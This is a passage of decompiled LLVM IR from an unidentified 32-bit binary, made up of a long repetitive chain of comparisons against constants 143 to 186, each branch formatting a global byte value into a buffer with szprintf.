  %v3_10005de4 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10005de4 = zext i8 %v3_10005de4 to i32
  %v4_10005e14 = call i32 @szprintf(i32 %v2_10005dd0, i32 ptrtoint ([13 x i8]* @global_var_10016d5c.184 to i32), i32 %v4_10005de4)
  br label %dec_label_pc_10005e18

dec_label_pc_10005e18:                            ; preds = %dec_label_pc_10005dc4, %dec_label_pc_10005dd0
  %v3_10005e1c = icmp eq i32 %v2_10002f1c, 143
  br i1 %v3_10005e1c, label %dec_label_pc_10005e24, label %dec_label_pc_10005e6c

dec_label_pc_10005e24:                            ; preds = %dec_label_pc_10005e18
  %v2_10005e24 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005e38 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10005e38 = zext i8 %v3_10005e38 to i32
  %v4_10005e68 = call i32 @szprintf(i32 %v2_10005e24, i32 ptrtoint ([14 x i8]* @global_var_10016c4c.167 to i32), i32 %v4_10005e38)
  br label %dec_label_pc_10005e6c

dec_label_pc_10005e6c:                            ; preds = %dec_label_pc_10005e18, %dec_label_pc_10005e24
  %v3_10005e70 = icmp eq i32 %v2_10002f1c, 144
  br i1 %v3_10005e70, label %dec_label_pc_10005e78, label %dec_label_pc_10005ec0

dec_label_pc_10005e78:                            ; preds = %dec_label_pc_10005e6c
  %v2_10005e78 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005e8c = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10005e8c = zext i8 %v3_10005e8c to i32
  %v4_10005ebc = call i32 @szprintf(i32 %v2_10005e78, i32 ptrtoint ([14 x i8]* @global_var_10016d6c.185 to i32), i32 %v4_10005e8c)
  br label %dec_label_pc_10005ec0

dec_label_pc_10005ec0:                            ; preds = %dec_label_pc_10005e6c, %dec_label_pc_10005e78
  %v3_10005ec4 = icmp eq i32 %v2_10002f1c, 145
  br i1 %v3_10005ec4, label %dec_label_pc_10005ecc, label %dec_label_pc_10005f14

dec_label_pc_10005ecc:                            ; preds = %dec_label_pc_10005ec0
  %v2_10005ecc = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005ee0 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10005ee0 = zext i8 %v3_10005ee0 to i32
  %v4_10005f10 = call i32 @szprintf(i32 %v2_10005ecc, i32 ptrtoint ([14 x i8]* @global_var_10016d7c.186 to i32), i32 %v4_10005ee0)
  br label %dec_label_pc_10005f14

dec_label_pc_10005f14:                            ; preds = %dec_label_pc_10005ec0, %dec_label_pc_10005ecc
  %v3_10005f18 = icmp eq i32 %v2_10002f1c, 146
  br i1 %v3_10005f18, label %dec_label_pc_10005f20, label %dec_label_pc_10005f68

dec_label_pc_10005f20:                            ; preds = %dec_label_pc_10005f14
  %v2_10005f20 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005f34 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10005f34 = zext i8 %v3_10005f34 to i32
  %v4_10005f64 = call i32 @szprintf(i32 %v2_10005f20, i32 ptrtoint ([14 x i8]* @global_var_10016d8c.187 to i32), i32 %v4_10005f34)
  br label %dec_label_pc_10005f68

dec_label_pc_10005f68:                            ; preds = %dec_label_pc_10005f14, %dec_label_pc_10005f20
  %v3_10005f6c = icmp eq i32 %v2_10002f1c, 147
  br i1 %v3_10005f6c, label %dec_label_pc_10005f74, label %dec_label_pc_10005fbc

dec_label_pc_10005f74:                            ; preds = %dec_label_pc_10005f68
  %v2_10005f74 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005f88 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10005f88 = zext i8 %v3_10005f88 to i32
  %v4_10005fb8 = call i32 @szprintf(i32 %v2_10005f74, i32 ptrtoint ([13 x i8]* @global_var_10016d9c.188 to i32), i32 %v4_10005f88)
  br label %dec_label_pc_10005fbc

dec_label_pc_10005fbc:                            ; preds = %dec_label_pc_10005f68, %dec_label_pc_10005f74
  %v3_10005fc0 = icmp eq i32 %v2_10002f1c, 148
  br i1 %v3_10005fc0, label %dec_label_pc_10005fc8, label %dec_label_pc_10006010

dec_label_pc_10005fc8:                            ; preds = %dec_label_pc_10005fbc
  %v2_10005fc8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005fdc = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10005fdc = zext i8 %v3_10005fdc to i32
  %v4_1000600c = call i32 @szprintf(i32 %v2_10005fc8, i32 ptrtoint ([13 x i8]* @global_var_10016dac.189 to i32), i32 %v4_10005fdc)
  br label %dec_label_pc_10006010

dec_label_pc_10006010:                            ; preds = %dec_label_pc_10005fbc, %dec_label_pc_10005fc8
  %v3_10006014 = icmp eq i32 %v2_10002f1c, 149
  br i1 %v3_10006014, label %dec_label_pc_1000601c, label %dec_label_pc_10006064

dec_label_pc_1000601c:                            ; preds = %dec_label_pc_10006010
  %v2_1000601c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006030 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10006030 = zext i8 %v3_10006030 to i32
  %v4_10006060 = call i32 @szprintf(i32 %v2_1000601c, i32 ptrtoint ([14 x i8]* @global_var_10016dbc.190 to i32), i32 %v4_10006030)
  br label %dec_label_pc_10006064

dec_label_pc_10006064:                            ; preds = %dec_label_pc_10006010, %dec_label_pc_1000601c
  %v3_10006068 = icmp eq i32 %v2_10002f1c, 150
  br i1 %v3_10006068, label %dec_label_pc_10006070, label %dec_label_pc_100060b8

dec_label_pc_10006070:                            ; preds = %dec_label_pc_10006064
  %v2_10006070 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006084 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10006084 = zext i8 %v3_10006084 to i32
  %v4_100060b4 = call i32 @szprintf(i32 %v2_10006070, i32 ptrtoint ([14 x i8]* @global_var_10016dcc.191 to i32), i32 %v4_10006084)
  br label %dec_label_pc_100060b8

dec_label_pc_100060b8:                            ; preds = %dec_label_pc_10006064, %dec_label_pc_10006070
  %v3_100060bc = icmp eq i32 %v2_10002f1c, 151
  br i1 %v3_100060bc, label %dec_label_pc_100060c4, label %dec_label_pc_1000610c

dec_label_pc_100060c4:                            ; preds = %dec_label_pc_100060b8
  %v2_100060c4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100060d8 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_100060d8 = zext i8 %v3_100060d8 to i32
  %v4_10006108 = call i32 @szprintf(i32 %v2_100060c4, i32 ptrtoint ([14 x i8]* @global_var_10016ddc.192 to i32), i32 %v4_100060d8)
  br label %dec_label_pc_1000610c

dec_label_pc_1000610c:                            ; preds = %dec_label_pc_100060b8, %dec_label_pc_100060c4
  %v3_10006110 = icmp eq i32 %v2_10002f1c, 152
  br i1 %v3_10006110, label %dec_label_pc_10006118, label %dec_label_pc_10006160

dec_label_pc_10006118:                            ; preds = %dec_label_pc_1000610c
  %v2_10006118 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000612c = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_1000612c = zext i8 %v3_1000612c to i32
  %v4_1000615c = call i32 @szprintf(i32 %v2_10006118, i32 ptrtoint ([14 x i8]* @global_var_10016bc0.158 to i32), i32 %v4_1000612c)
  br label %dec_label_pc_10006160

dec_label_pc_10006160:                            ; preds = %dec_label_pc_1000610c, %dec_label_pc_10006118
  %v3_10006164 = icmp eq i32 %v2_10002f1c, 153
  br i1 %v3_10006164, label %dec_label_pc_1000616c, label %dec_label_pc_100061b4

dec_label_pc_1000616c:                            ; preds = %dec_label_pc_10006160
  %v2_1000616c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006180 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10006180 = zext i8 %v3_10006180 to i32
  %v4_100061b0 = call i32 @szprintf(i32 %v2_1000616c, i32 ptrtoint ([13 x i8]* @global_var_10016dec.193 to i32), i32 %v4_10006180)
  br label %dec_label_pc_100061b4

dec_label_pc_100061b4:                            ; preds = %dec_label_pc_10006160, %dec_label_pc_1000616c
  %v3_100061b8 = icmp eq i32 %v2_10002f1c, 154
  br i1 %v3_100061b8, label %dec_label_pc_100061c0, label %dec_label_pc_10006208

dec_label_pc_100061c0:                            ; preds = %dec_label_pc_100061b4
  %v2_100061c0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100061d4 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_100061d4 = zext i8 %v3_100061d4 to i32
  %v4_10006204 = call i32 @szprintf(i32 %v2_100061c0, i32 ptrtoint ([13 x i8]* @global_var_10016dfc.194 to i32), i32 %v4_100061d4)
  br label %dec_label_pc_10006208

dec_label_pc_10006208:                            ; preds = %dec_label_pc_100061b4, %dec_label_pc_100061c0
  %v3_1000620c = icmp eq i32 %v2_10002f1c, 155
  br i1 %v3_1000620c, label %dec_label_pc_10006214, label %dec_label_pc_1000625c

dec_label_pc_10006214:                            ; preds = %dec_label_pc_10006208
  %v2_10006214 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006228 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10006228 = zext i8 %v3_10006228 to i32
  %v4_10006258 = call i32 @szprintf(i32 %v2_10006214, i32 ptrtoint ([13 x i8]* @global_var_10016e0c.195 to i32), i32 %v4_10006228)
  br label %dec_label_pc_1000625c

dec_label_pc_1000625c:                            ; preds = %dec_label_pc_10006208, %dec_label_pc_10006214
  %v3_10006260 = icmp eq i32 %v2_10002f1c, 156
  br i1 %v3_10006260, label %dec_label_pc_10006268, label %dec_label_pc_100062b0

dec_label_pc_10006268:                            ; preds = %dec_label_pc_1000625c
  %v2_10006268 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000627c = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_1000627c = zext i8 %v3_1000627c to i32
  %v4_100062ac = call i32 @szprintf(i32 %v2_10006268, i32 ptrtoint ([13 x i8]* @global_var_10016e1c.196 to i32), i32 %v4_1000627c)
  br label %dec_label_pc_100062b0

dec_label_pc_100062b0:                            ; preds = %dec_label_pc_1000625c, %dec_label_pc_10006268
  %v3_100062b4 = icmp eq i32 %v2_10002f1c, 157
  br i1 %v3_100062b4, label %dec_label_pc_100062bc, label %dec_label_pc_10006304

dec_label_pc_100062bc:                            ; preds = %dec_label_pc_100062b0
  %v2_100062bc = ptrtoint i32* %stack_var_-52 to i32
  %v3_100062d0 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_100062d0 = zext i8 %v3_100062d0 to i32
  %v4_10006300 = call i32 @szprintf(i32 %v2_100062bc, i32 ptrtoint ([13 x i8]* @global_var_10016e2c.197 to i32), i32 %v4_100062d0)
  br label %dec_label_pc_10006304

dec_label_pc_10006304:                            ; preds = %dec_label_pc_100062b0, %dec_label_pc_100062bc
  %v3_10006308 = icmp eq i32 %v2_10002f1c, 158
  br i1 %v3_10006308, label %dec_label_pc_10006310, label %dec_label_pc_10006358

dec_label_pc_10006310:                            ; preds = %dec_label_pc_10006304
  %v2_10006310 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006324 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10006324 = zext i8 %v3_10006324 to i32
  %v4_10006354 = call i32 @szprintf(i32 %v2_10006310, i32 ptrtoint ([12 x i8]* @global_var_10016e3c.198 to i32), i32 %v4_10006324)
  br label %dec_label_pc_10006358

dec_label_pc_10006358:                            ; preds = %dec_label_pc_10006304, %dec_label_pc_10006310
  %v3_1000635c = icmp eq i32 %v2_10002f1c, 159
  br i1 %v3_1000635c, label %dec_label_pc_10006364, label %dec_label_pc_100063ac

dec_label_pc_10006364:                            ; preds = %dec_label_pc_10006358
  %v2_10006364 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006378 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10006378 = zext i8 %v3_10006378 to i32
  %v4_100063a8 = call i32 @szprintf(i32 %v2_10006364, i32 ptrtoint ([14 x i8]* @global_var_10016e48.199 to i32), i32 %v4_10006378)
  br label %dec_label_pc_100063ac

dec_label_pc_100063ac:                            ; preds = %dec_label_pc_10006358, %dec_label_pc_10006364
  %v3_100063b0 = icmp eq i32 %v2_10002f1c, 160
  br i1 %v3_100063b0, label %dec_label_pc_100063b8, label %dec_label_pc_10006400

dec_label_pc_100063b8:                            ; preds = %dec_label_pc_100063ac
  %v2_100063b8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100063cc = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_100063cc = zext i8 %v3_100063cc to i32
  %v4_100063fc = call i32 @szprintf(i32 %v2_100063b8, i32 ptrtoint ([13 x i8]* @global_var_10016e58.200 to i32), i32 %v4_100063cc)
  br label %dec_label_pc_10006400

dec_label_pc_10006400:                            ; preds = %dec_label_pc_100063ac, %dec_label_pc_100063b8
  %v3_10006404 = icmp eq i32 %v2_10002f1c, 161
  br i1 %v3_10006404, label %dec_label_pc_1000640c, label %dec_label_pc_10006454

dec_label_pc_1000640c:                            ; preds = %dec_label_pc_10006400
  %v2_1000640c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006420 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10006420 = zext i8 %v3_10006420 to i32
  %v4_10006450 = call i32 @szprintf(i32 %v2_1000640c, i32 ptrtoint ([14 x i8]* @global_var_10016e68.201 to i32), i32 %v4_10006420)
  br label %dec_label_pc_10006454

dec_label_pc_10006454:                            ; preds = %dec_label_pc_10006400, %dec_label_pc_1000640c
  %v3_10006458 = icmp eq i32 %v2_10002f1c, 162
  br i1 %v3_10006458, label %dec_label_pc_10006460, label %dec_label_pc_100064a8

dec_label_pc_10006460:                            ; preds = %dec_label_pc_10006454
  %v2_10006460 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006474 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10006474 = zext i8 %v3_10006474 to i32
  %v4_100064a4 = call i32 @szprintf(i32 %v2_10006460, i32 ptrtoint ([14 x i8]* @global_var_10016e78.202 to i32), i32 %v4_10006474)
  br label %dec_label_pc_100064a8

dec_label_pc_100064a8:                            ; preds = %dec_label_pc_10006454, %dec_label_pc_10006460
  %v3_100064ac = icmp eq i32 %v2_10002f1c, 163
  br i1 %v3_100064ac, label %dec_label_pc_100064b4, label %dec_label_pc_100064fc

dec_label_pc_100064b4:                            ; preds = %dec_label_pc_100064a8
  %v2_100064b4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100064c8 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_100064c8 = zext i8 %v3_100064c8 to i32
  %v4_100064f8 = call i32 @szprintf(i32 %v2_100064b4, i32 ptrtoint ([14 x i8]* @global_var_10016e88.203 to i32), i32 %v4_100064c8)
  br label %dec_label_pc_100064fc

dec_label_pc_100064fc:                            ; preds = %dec_label_pc_100064a8, %dec_label_pc_100064b4
  %v3_10006500 = icmp eq i32 %v2_10002f1c, 164
  br i1 %v3_10006500, label %dec_label_pc_10006508, label %dec_label_pc_10006550

dec_label_pc_10006508:                            ; preds = %dec_label_pc_100064fc
  %v2_10006508 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000651c = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_1000651c = zext i8 %v3_1000651c to i32
  %v4_1000654c = call i32 @szprintf(i32 %v2_10006508, i32 ptrtoint ([14 x i8]* @global_var_10016ddc.192 to i32), i32 %v4_1000651c)
  br label %dec_label_pc_10006550

dec_label_pc_10006550:                            ; preds = %dec_label_pc_100064fc, %dec_label_pc_10006508
  %v3_10006554 = icmp eq i32 %v2_10002f1c, 165
  br i1 %v3_10006554, label %dec_label_pc_1000655c, label %dec_label_pc_100065a4

dec_label_pc_1000655c:                            ; preds = %dec_label_pc_10006550
  %v2_1000655c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006570 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10006570 = zext i8 %v3_10006570 to i32
  %v4_100065a0 = call i32 @szprintf(i32 %v2_1000655c, i32 ptrtoint ([13 x i8]* @global_var_10016e98.204 to i32), i32 %v4_10006570)
  br label %dec_label_pc_100065a4

dec_label_pc_100065a4:                            ; preds = %dec_label_pc_10006550, %dec_label_pc_1000655c
  %v3_100065a8 = icmp eq i32 %v2_10002f1c, 166
  br i1 %v3_100065a8, label %dec_label_pc_100065b0, label %dec_label_pc_100065f8

dec_label_pc_100065b0:                            ; preds = %dec_label_pc_100065a4
  %v2_100065b0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100065c4 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_100065c4 = zext i8 %v3_100065c4 to i32
  %v4_100065f4 = call i32 @szprintf(i32 %v2_100065b0, i32 ptrtoint ([14 x i8]* @global_var_10016ea8.205 to i32), i32 %v4_100065c4)
  br label %dec_label_pc_100065f8

dec_label_pc_100065f8:                            ; preds = %dec_label_pc_100065a4, %dec_label_pc_100065b0
  %v3_100065fc = icmp eq i32 %v2_10002f1c, 167
  br i1 %v3_100065fc, label %dec_label_pc_10006604, label %dec_label_pc_1000664c

dec_label_pc_10006604:                            ; preds = %dec_label_pc_100065f8
  %v2_10006604 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006618 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10006618 = zext i8 %v3_10006618 to i32
  %v4_10006648 = call i32 @szprintf(i32 %v2_10006604, i32 ptrtoint ([14 x i8]* @global_var_10016e48.199 to i32), i32 %v4_10006618)
  br label %dec_label_pc_1000664c

dec_label_pc_1000664c:                            ; preds = %dec_label_pc_100065f8, %dec_label_pc_10006604
  %v3_10006650 = icmp eq i32 %v2_10002f1c, 168
  br i1 %v3_10006650, label %dec_label_pc_10006658, label %dec_label_pc_100066a0

dec_label_pc_10006658:                            ; preds = %dec_label_pc_1000664c
  %v2_10006658 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000666c = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_1000666c = zext i8 %v3_1000666c to i32
  %v4_1000669c = call i32 @szprintf(i32 %v2_10006658, i32 ptrtoint ([14 x i8]* @global_var_10016eb8.206 to i32), i32 %v4_1000666c)
  br label %dec_label_pc_100066a0

dec_label_pc_100066a0:                            ; preds = %dec_label_pc_1000664c, %dec_label_pc_10006658
  %v3_100066a4 = icmp eq i32 %v2_10002f1c, 169
  br i1 %v3_100066a4, label %dec_label_pc_100066ac, label %dec_label_pc_100066f4

dec_label_pc_100066ac:                            ; preds = %dec_label_pc_100066a0
  %v2_100066ac = ptrtoint i32* %stack_var_-52 to i32
  %v3_100066c0 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_100066c0 = zext i8 %v3_100066c0 to i32
  %v4_100066f0 = call i32 @szprintf(i32 %v2_100066ac, i32 ptrtoint ([14 x i8]* @global_var_10016ec8.207 to i32), i32 %v4_100066c0)
  br label %dec_label_pc_100066f4

dec_label_pc_100066f4:                            ; preds = %dec_label_pc_100066a0, %dec_label_pc_100066ac
  %v3_100066f8 = icmp eq i32 %v2_10002f1c, 171
  br i1 %v3_100066f8, label %dec_label_pc_10006700, label %dec_label_pc_10006748

dec_label_pc_10006700:                            ; preds = %dec_label_pc_100066f4
  %v2_10006700 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006714 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10006714 = zext i8 %v3_10006714 to i32
  %v4_10006744 = call i32 @szprintf(i32 %v2_10006700, i32 ptrtoint ([14 x i8]* @global_var_10016ed8.208 to i32), i32 %v4_10006714)
  br label %dec_label_pc_10006748

dec_label_pc_10006748:                            ; preds = %dec_label_pc_100066f4, %dec_label_pc_10006700
  %v3_1000674c = icmp eq i32 %v2_10002f1c, 172
  br i1 %v3_1000674c, label %dec_label_pc_10006754, label %dec_label_pc_1000679c

dec_label_pc_10006754:                            ; preds = %dec_label_pc_10006748
  %v2_10006754 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006768 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10006768 = zext i8 %v3_10006768 to i32
  %v4_10006798 = call i32 @szprintf(i32 %v2_10006754, i32 ptrtoint ([14 x i8]* @global_var_10016ee8.209 to i32), i32 %v4_10006768)
  br label %dec_label_pc_1000679c

dec_label_pc_1000679c:                            ; preds = %dec_label_pc_10006748, %dec_label_pc_10006754
  %v3_100067a0 = icmp eq i32 %v2_10002f1c, 173
  br i1 %v3_100067a0, label %dec_label_pc_100067a8, label %dec_label_pc_100067f0

dec_label_pc_100067a8:                            ; preds = %dec_label_pc_1000679c
  %v2_100067a8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100067bc = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_100067bc = zext i8 %v3_100067bc to i32
  %v4_100067ec = call i32 @szprintf(i32 %v2_100067a8, i32 ptrtoint ([14 x i8]* @global_var_10016ef8.210 to i32), i32 %v4_100067bc)
  br label %dec_label_pc_100067f0

dec_label_pc_100067f0:                            ; preds = %dec_label_pc_1000679c, %dec_label_pc_100067a8
  %v3_100067f4 = icmp eq i32 %v2_10002f1c, 174
  br i1 %v3_100067f4, label %dec_label_pc_100067fc, label %dec_label_pc_10006844

dec_label_pc_100067fc:                            ; preds = %dec_label_pc_100067f0
  %v2_100067fc = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006810 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10006810 = zext i8 %v3_10006810 to i32
  %v4_10006840 = call i32 @szprintf(i32 %v2_100067fc, i32 ptrtoint ([13 x i8]* @global_var_10016f08.211 to i32), i32 %v4_10006810)
  br label %dec_label_pc_10006844

dec_label_pc_10006844:                            ; preds = %dec_label_pc_100067f0, %dec_label_pc_100067fc
  %v3_10006848 = icmp eq i32 %v2_10002f1c, 175
  br i1 %v3_10006848, label %dec_label_pc_10006850, label %dec_label_pc_10006898

dec_label_pc_10006850:                            ; preds = %dec_label_pc_10006844
  %v2_10006850 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006864 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10006864 = zext i8 %v3_10006864 to i32
  %v4_10006894 = call i32 @szprintf(i32 %v2_10006850, i32 ptrtoint ([14 x i8]* @global_var_10016f18.212 to i32), i32 %v4_10006864)
  br label %dec_label_pc_10006898

dec_label_pc_10006898:                            ; preds = %dec_label_pc_10006844, %dec_label_pc_10006850
  %v3_1000689c = icmp eq i32 %v2_10002f1c, 176
  br i1 %v3_1000689c, label %dec_label_pc_100068a4, label %dec_label_pc_100068ec

dec_label_pc_100068a4:                            ; preds = %dec_label_pc_10006898
  %v2_100068a4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100068b8 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_100068b8 = zext i8 %v3_100068b8 to i32
  %v4_100068e8 = call i32 @szprintf(i32 %v2_100068a4, i32 ptrtoint ([14 x i8]* @global_var_10016f28.213 to i32), i32 %v4_100068b8)
  br label %dec_label_pc_100068ec

dec_label_pc_100068ec:                            ; preds = %dec_label_pc_10006898, %dec_label_pc_100068a4
  %v3_100068f0 = icmp eq i32 %v2_10002f1c, 177
  br i1 %v3_100068f0, label %dec_label_pc_100068f8, label %dec_label_pc_10006940

dec_label_pc_100068f8:                            ; preds = %dec_label_pc_100068ec
  %v2_100068f8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000690c = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_1000690c = zext i8 %v3_1000690c to i32
  %v4_1000693c = call i32 @szprintf(i32 %v2_100068f8, i32 ptrtoint ([14 x i8]* @global_var_10016f38.214 to i32), i32 %v4_1000690c)
  br label %dec_label_pc_10006940

dec_label_pc_10006940:                            ; preds = %dec_label_pc_100068ec, %dec_label_pc_100068f8
  %v3_10006944 = icmp eq i32 %v2_10002f1c, 178
  br i1 %v3_10006944, label %dec_label_pc_1000694c, label %dec_label_pc_10006994

dec_label_pc_1000694c:                            ; preds = %dec_label_pc_10006940
  %v2_1000694c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006960 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10006960 = zext i8 %v3_10006960 to i32
  %v4_10006990 = call i32 @szprintf(i32 %v2_1000694c, i32 ptrtoint ([13 x i8]* @global_var_10016f48.215 to i32), i32 %v4_10006960)
  br label %dec_label_pc_10006994

dec_label_pc_10006994:                            ; preds = %dec_label_pc_10006940, %dec_label_pc_1000694c
  %v3_10006998 = icmp eq i32 %v2_10002f1c, 179
  br i1 %v3_10006998, label %dec_label_pc_100069a0, label %dec_label_pc_100069e8

dec_label_pc_100069a0:                            ; preds = %dec_label_pc_10006994
  %v2_100069a0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100069b4 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_100069b4 = zext i8 %v3_100069b4 to i32
  %v4_100069e4 = call i32 @szprintf(i32 %v2_100069a0, i32 ptrtoint ([13 x i8]* @global_var_10016f58.216 to i32), i32 %v4_100069b4)
  br label %dec_label_pc_100069e8

dec_label_pc_100069e8:                            ; preds = %dec_label_pc_10006994, %dec_label_pc_100069a0
  %v3_100069ec = icmp eq i32 %v2_10002f1c, 180
  br i1 %v3_100069ec, label %dec_label_pc_100069f4, label %dec_label_pc_10006a3c

dec_label_pc_100069f4:                            ; preds = %dec_label_pc_100069e8
  %v2_100069f4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006a08 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10006a08 = zext i8 %v3_10006a08 to i32
  %v4_10006a38 = call i32 @szprintf(i32 %v2_100069f4, i32 ptrtoint ([13 x i8]* @global_var_10016f68.217 to i32), i32 %v4_10006a08)
  br label %dec_label_pc_10006a3c

dec_label_pc_10006a3c:                            ; preds = %dec_label_pc_100069e8, %dec_label_pc_100069f4
  %v3_10006a40 = icmp eq i32 %v2_10002f1c, 181
  br i1 %v3_10006a40, label %dec_label_pc_10006a48, label %dec_label_pc_10006a90

dec_label_pc_10006a48:                            ; preds = %dec_label_pc_10006a3c
  %v2_10006a48 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006a5c = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10006a5c = zext i8 %v3_10006a5c to i32
  %v4_10006a8c = call i32 @szprintf(i32 %v2_10006a48, i32 ptrtoint ([13 x i8]* @global_var_10016f78.218 to i32), i32 %v4_10006a5c)
  br label %dec_label_pc_10006a90

dec_label_pc_10006a90:                            ; preds = %dec_label_pc_10006a3c, %dec_label_pc_10006a48
  %v3_10006a94 = icmp eq i32 %v2_10002f1c, 182
  br i1 %v3_10006a94, label %dec_label_pc_10006a9c, label %dec_label_pc_10006ae4

dec_label_pc_10006a9c:                            ; preds = %dec_label_pc_10006a90
  %v2_10006a9c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006ab0 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10006ab0 = zext i8 %v3_10006ab0 to i32
  %v4_10006ae0 = call i32 @szprintf(i32 %v2_10006a9c, i32 ptrtoint ([13 x i8]* @global_var_10016f88.219 to i32), i32 %v4_10006ab0)
  br label %dec_label_pc_10006ae4

dec_label_pc_10006ae4:                            ; preds = %dec_label_pc_10006a90, %dec_label_pc_10006a9c
  %v3_10006ae8 = icmp eq i32 %v2_10002f1c, 183
  br i1 %v3_10006ae8, label %dec_label_pc_10006af0, label %dec_label_pc_10006b38

dec_label_pc_10006af0:                            ; preds = %dec_label_pc_10006ae4
  %v2_10006af0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006b04 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10006b04 = zext i8 %v3_10006b04 to i32
  %v4_10006b34 = call i32 @szprintf(i32 %v2_10006af0, i32 ptrtoint ([13 x i8]* @global_var_10016788.90 to i32), i32 %v4_10006b04)
  br label %dec_label_pc_10006b38

dec_label_pc_10006b38:                            ; preds = %dec_label_pc_10006ae4, %dec_label_pc_10006af0
  %v3_10006b3c = icmp eq i32 %v2_10002f1c, 184
  br i1 %v3_10006b3c, label %dec_label_pc_10006b44, label %dec_label_pc_10006b8c

dec_label_pc_10006b44:                            ; preds = %dec_label_pc_10006b38
  %v2_10006b44 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006b58 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10006b58 = zext i8 %v3_10006b58 to i32
  %v4_10006b88 = call i32 @szprintf(i32 %v2_10006b44, i32 ptrtoint ([13 x i8]* @global_var_10016f98.220 to i32), i32 %v4_10006b58)
  br label %dec_label_pc_10006b8c

dec_label_pc_10006b8c:                            ; preds = %dec_label_pc_10006b38, %dec_label_pc_10006b44
  %v3_10006b90 = icmp eq i32 %v2_10002f1c, 185
  br i1 %v3_10006b90, label %dec_label_pc_10006b98, label %dec_label_pc_10006be0

dec_label_pc_10006b98:                            ; preds = %dec_label_pc_10006b8c
  %v2_10006b98 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006bac = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10006bac = zext i8 %v3_10006bac to i32
  %v4_10006bdc = call i32 @szprintf(i32 %v2_10006b98, i32 ptrtoint ([13 x i8]* @global_var_10016fa8.221 to i32), i32 %v4_10006bac)
  br label %dec_label_pc_10006be0

dec_label_pc_10006be0:                            ; preds = %dec_label_pc_10006b8c, %dec_label_pc_10006b98
  %v3_10006be4 = icmp eq i32 %v2_10002f1c, 186
  br i1 %v3_10006be4, label %dec_label_pc_10006bec, label %dec_label_pc_10006c34

dec_label_pc_10006bec:                            ; preds = %dec_label_pc_10006be0
  %v2_10006bec = ptrtoint i32* %stack_var_-52 to i32
